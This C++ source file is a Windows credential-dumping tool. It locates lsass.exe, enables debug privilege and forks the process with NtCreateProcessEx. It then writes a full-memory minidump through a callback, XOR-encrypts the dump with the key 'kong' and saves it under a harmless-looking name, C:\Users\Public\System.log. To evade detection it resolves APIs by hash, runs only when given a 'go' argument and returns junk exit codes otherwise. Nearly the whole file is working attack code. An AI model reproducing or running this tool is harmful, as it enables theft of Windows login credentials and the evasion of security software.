#include <windows.h>
#include <DbgHelp.h>
#include <stdio.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#pragma comment (lib, "Dbghelp.lib")
#include "global.h"

typedef HANDLE(WINAPI* fnopen)(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
	);

typedef NTSTATUS(NTAPI* fnNtCreateEx)(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ParentProcess,
	IN ULONG Flags,
	IN HANDLE SectionHandle OPTIONAL,
	IN HANDLE DebugPort OPTIONAL,
	IN HANDLE ExceptionPort OPTIONAL,
	IN BOOLEAN InJob
	);

typedef BOOL(WINAPI* fnWritef)(
	HANDLE hFile,
	LPCVOID lpBuffer,
	DWORD nNumberOfBytesToWrite,
	LPDWORD lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
	);

typedef HANDLE(WINAPI* fnCreateFile)(
	LPCWSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile
	);


ForkSnapshot::ForkSnapshot(
	_In_ DWORD TargetProcessId
)
{
	HMODULE mod = LoadLibrary(L"KERNEL32.dll");
	LPVOID addr = getAPIAddr(mod, 17260444);
	fnopen openpe = (fnopen)addr;
	this->CurrentSnapshotProcess = NULL;
	this->TargetProcess = openpe(PROCESS_CREATE_PROCESS, FALSE, TargetProcessId);
	if (this->TargetProcess == NULL)
	{
		DBGPRINT(" %i.", TargetProcessId, GetLastError());
	}
}

ForkSnapshot::ForkSnapshot(
	_In_ HANDLE TargetProcess
)
{
	this->CurrentSnapshotProcess = NULL;
	this->TargetProcess = TargetProcess;
}
ForkSnapshot::~ForkSnapshot(
	VOID
)
{
	if (this->CurrentSnapshotProcess != NULL)
	{
		this->CleanSnapshot();
	}
}


HANDLE
ForkSnapshot::TakeSnapshot(
	VOID
)
{
	NTSTATUS status;

	if (this->CurrentSnapshotProcess != NULL)
	{
		if (this->CleanSnapshot() == FALSE)
		{
			DBGPRINT(".");
			return NULL;
		}
	}
	HMODULE ntmod = LoadLibrary(L"ntdll.dll");
	LPVOID ntaddr = getAPIAddr(ntmod, 12449346123);
	fnNtCreateEx fnNtCreatEx = (fnNtCreateEx)ntaddr;

	status = fnNtCreatEx(&this->CurrentSnapshotProcess,
		PROCESS_ALL_ACCESS,
		NULL,
		this->TargetProcess,
		0,
		NULL,
		NULL,
		NULL,
		0);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT(" 0x%X.", status);
		return NULL;
	}

	return this->CurrentSnapshotProcess;
}

BOOL
ForkSnapshot::CleanSnapshot(
	VOID
)
{
	BOOL cleanSuccess;

	cleanSuccess = TRUE;

	if (this->CurrentSnapshotProcess)
	{
		cleanSuccess = TerminateProcess(this->CurrentSnapshotProcess, 0);
		CloseHandle(this->CurrentSnapshotProcess);
		if (cleanSuccess == FALSE)
		{;
		}
		this->CurrentSnapshotProcess = NULL;
	}

	return cleanSuccess;
}

LPVOID buffer = MHeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;


BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)buffer + (DWORD_PTR)callbackInput->Io.Offset);
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}


typedef NTSTATUS(__stdcall* NtDelayExecution_t)(BOOL Alertable, PLARGE_INTEGER DelayInterval);
typedef NTSTATUS(__stdcall* ZwSetTimerResolution_t)(ULONG RequestedResolution, BOOLEAN Set, PULONG ActualResolution);

static NtDelayExecution_t g_NtDelayExecution = NULL;
static ZwSetTimerResolution_t g_ZwSetTimerResolution = NULL;
static bool g_ntdllInitialized = false;

static void InitializeNtdllFunctions() {
	if (!g_ntdllInitialized) {
		HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
		if (hNtdll) {
			g_NtDelayExecution = (NtDelayExecution_t)getAPIAddr(hNtdll, 4145672972);
			g_ZwSetTimerResolution = (ZwSetTimerResolution_t)getAPIAddr(hNtdll, 352891342181);
		}
		g_ntdllInitialized = true;
	}
}

void wait(DWORD milliseconds)
{
	InitializeNtdllFunctions();

	static bool timerResolutionSet = false;
	if (!timerResolutionSet && g_ZwSetTimerResolution != NULL) {
		ULONG actualResolution = 0;
		g_ZwSetTimerResolution(1, TRUE, &actualResolution);
		timerResolutionSet = true;
	}
	LARGE_INTEGER interval;
	interval.QuadPart = -((LONGLONG)milliseconds * 10000);

	if (g_NtDelayExecution != NULL) {
		g_NtDelayExecution(FALSE, &interval);
	}
}

int main(int argc, char* argv[]) {

	if (__argc == 1) {
		return 7899 * 1777;
	}
	else if (__argc == 2) {
		if (strcmp(__argv[1], "go") != 0)
		{
			return 7 * 12899;
		}
	}
	else {
		return 1717 * 1888;
	}
	wait(1000);
	DWORD PID = 0;
	DWORD bytesWritten = 0;
	HANDLE lHandle = NULL;
	HANDLE snapshot = MCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	LPCWSTR processName = L"";
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	ULONG  t;
	
	if (MProcess32FirstW(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			MProcess32NextW(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			PID = processEntry.th32ProcessID;
		}
	}
	MRtlAdjustPrivilege(20, TRUE, FALSE, &t);
	ForkSnapshot forkSnapshot(PID);
	lHandle = forkSnapshot.TakeSnapshot();
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;
	BOOL isD = MMiniDumpWriteDump(lHandle, PID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
	if (isD)
	{
		long int size = bytesRead;

		char *securitySth = new char[size];

		char *key = (char *)"kong";

		memcpy(securitySth,buffer,bytesRead);;
		HMODULE wrmod = LoadLibrary(L"KERNEL32.dll");
		LPVOID wraddr = getAPIAddr(wrmod, 1979498);
		fnWritef fnWrite = (fnWritef)wraddr;
		LPVOID wcaddr = getAPIAddr(wrmod, 16582710);
		fnCreateFile fnCreateF = (fnCreateFile)wcaddr;
		securitySth = Xorcrypt(securitySth, bytesRead, key);
		HANDLE outFile = fnCreateF(L"C:\\Users\\Public\\System.log", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (fnWrite(outFile, securitySth, bytesRead, &bytesWritten, NULL))
		{
			printf("\n[+] to C:\\Users\\Public\\System.log\n");
		}

		CloseHandle(outFile);
	}

	return 0;
}
